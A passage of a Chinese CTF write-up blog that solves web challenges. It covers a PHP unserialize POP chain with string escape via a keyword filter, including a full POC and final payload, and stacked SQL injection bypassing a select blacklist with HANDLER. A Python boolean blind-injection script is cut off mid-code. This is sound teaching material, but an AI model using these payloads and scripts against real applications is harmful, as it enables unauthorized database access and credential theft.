class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=$age,nickname=$nickname where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>update.php</code>得知，只要用admin登陆成功，即可获得flag。</p><p>核心代码在<code>lib.php</code>找反序列化点，在<code>User</code>类内：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br></pre></td></tr></table></figure><p>发现下面定义中，<code>$age</code>和<code>$nickname</code>是可控的，其将Info对象序列化后经过<code>safe()</code>函数处理返回给<code>update()</code>进行反序列化。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>safe函数</code>, 将很多SQL的关键字过滤，替换为<code>hacker</code>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将关键字换成<code>hacker</code>, 导致长度发生变化（变长），可以进一步进行字符逃逸，然后注入对象。</p><p>在update.php内发现实例化了User并且调用了<code>User-&gt;update()</code>进行反序列化等操作，如果登录成功则输出flag：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>User</code>对象，可以看到<code>__toString()</code>魔术方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>来到<code>UpdateHelper</code>类，发现会把sql给<code>echo()</code>出来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果<code>$sql = new User()</code>的话，就会触发User内的<code>__toString()</code>魔术方法，该魔术方法内调用了<code>$nickname</code>属性的<code>update()</code>方法。虽然<code>dbCtrl</code>对象拥有<code>update()</code>方法，但真正是自己做的题的话就会发现，若<code>$nickname</code>实例化成个对象没意义，那个<code>update()</code>方法完全是障眼法，只能继续看。</p><p>可以发现Info类内有<code>__Call()</code>魔术方法，如果调用了一个不存在的属性，<code>__Call()</code>方法就会触发，正好Info类没有<code>update()</code>方法，如果User内的<code>$nickname</code>实例化为Info对象，调用不存在的<code>update()</code>就会触发这个<code>__Call()</code>，这个<code>__Call()</code>魔术方法将<code>Ctrlcase</code>的<code>login()</code>函数结果输出出来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就很明显了，要把<code>$this-&gt;CtrlCase</code>实例化成<code>dbCtrl</code>对象，调用dbCtrl对象内的<code>login()</code>方法，跟进：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br></pre></td></tr></table></figure><p>发现它正好把SQL的结果给返回了，这样整个pop链基本就理清楚了：</p><p>利用<code>UpdateHelper</code>的<code>__destruct</code>触发<code>User</code>的<code>__toString</code>然后走到<code>Info</code>的<code>__call</code>方法，在<code>__call</code>中调用了<code>dbCtrl</code>类的<code>login</code>方法，通过控制查询语句，把admin账户的密码查出来。</p><p>注意前面的内容中标注了有3个属性，为了保证属性一致，在payload前面加上CtrlCase的内容，然后在最后闭合语句，使<code>unserialize</code>忽略掉后面的<code>CtrlCase</code></p><p>还需要在<code>nickname</code>中插入足量的黑名单字符，把payload挤出去。</p><p>POC</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age= <span class="string">&#x27;select password,id from user where username=?&#x27;</span>; <span class="comment">//要把id放password后面</span></span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$v0w = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$v0w-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">$v0w-&gt;sql-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">$v0w-&gt;sql-&gt;nickname-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line"></span><br><span class="line">$v0w = <span class="string">&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;</span> . serialize($v0w) . <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">$length = strlen($v0w);</span><br><span class="line">$v0w = str_repeat(<span class="string">&#x27;union&#x27;</span>, $length).$v0w;</span><br><span class="line"><span class="keyword">echo</span>($v0w);</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后到网站的<code>update.php</code></p><p>POST: <code>age=1&amp;nickname=payload</code></p><p>得到admin密码的md5</p><p><img src="https://i.loli.net/2020/02/25/rdiGkDAlU82Y1FP.png"></p><p>解密后得到密码：<code>yingyingying</code>，登陆admin，得到flag</p><p><img src="https://i.loli.net/2020/02/25/gPY3R4H5ImdGsUZ.png"></p><h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>应该是一个<code>sqlshell</code>，进行<code>union select</code>时，给出<code>balcklist</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure><p>想办法进行绕过。</p><p>查表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show tables;#</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;FlagHere&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show columns from FlagHere;#</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MySQL有一个handler的可以代替select进行查询，payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; handler FlagHere open as v; handler v read first; handler v close;#</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(42) &quot;flag&#123;d9a362a0-3c8a-4f0e-b4fd-880287d5be73&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>预备知识：</p><blockquote><p>对MYSQL注入相关内容及部分Trick的归类小结  <a href="https://xz.aliyun.com/t/7169#toc-50">https://xz.aliyun.com/t/7169#toc-50</a></p><p>聊一聊bypass information_schema  <a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p></blockquote><p>这个题看了P3rh4ps、rdd师傅的wp和微笑师傅的官方wp：</p><blockquote><p>P3: <a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p>rdd: <a href="https://blog.csdn.net/qq_40648358/article/details/104456748">https://blog.csdn.net/qq_40648358/article/details/104456748</a></p><p>smi1e:<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p></blockquote><p>刚开始还好，fuzz发现：</p><ul><li>过滤了and or关键字</li><li>过滤了if</li><li>不能用information_schema</li><li>没有单独过滤union和select, 但是过滤了union select，union某某某select之类</li><li>过滤了sys.schema_auto_increment_columns </li><li>过滤了join</li></ul><p>fuzz还发现：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">返回Hello CQGAME</span><br><span class="line">2||1&#x3D;1</span><br><span class="line">返回Hello Nu1L</span><br><span class="line">2||1&#x3D;5</span><br><span class="line">返回Hello CQGAME</span><br></pre></td></tr></table></figure><p>也就是说，本来2查询的是CQGAME，如果<code>||</code>后面的表达式为True则返回Nu1L、false则返回CQGAME。继续测试：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||substr((select 1),1,1)&#x3D;2</span><br><span class="line">Hello CQGAME</span><br><span class="line">2||substr((select 1),1,1)&#x3D;1</span><br><span class="line">Hello Nu1L</span><br></pre></td></tr></table></figure><p>说明可以布尔盲注。</p><p>这里抄了一下<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">smi1e师傅的payload</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp1</span>():</span></span><br><span class="line">    str1 = (<span class="string">&#x27;0123456789&#x27;</span>+string.ascii_letters+string.punctuation).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    select = <span class="string">&#x27;select group_concat(table_name) from sys.x$schema_flattened_keys&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            paylaod = <span class="string">&quot;1/**/&amp;&amp;/**/(select substr((&#123;&#125;),&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;&quot;</span>.format(select, j, i)</span><br><span class="line">            <span class="comment">#print(paylaod)</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp2</span>():</span></span><br><span class="line">    str1 = (<span class="string">&#x27;-0123456789&#x27;</span>+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag_table_name = <span class="string">&#x27;f1ag_1s_h3r3_hhhhh&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            i = flag+i</span><br><span class="line">            paylaod = <span class="string">&quot;1&amp;&amp;((select 1,concat(&#x27;&#123;&#125;~&#x27;,CAST(&#x27;0&#x27; as json))) &lt; (select * from &#123;&#125; limit 1))&quot;</span>.format(i,flag_table_name)</span><br><span class="line">            <span class="comment">#print(paylaod)</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">not</span> <span 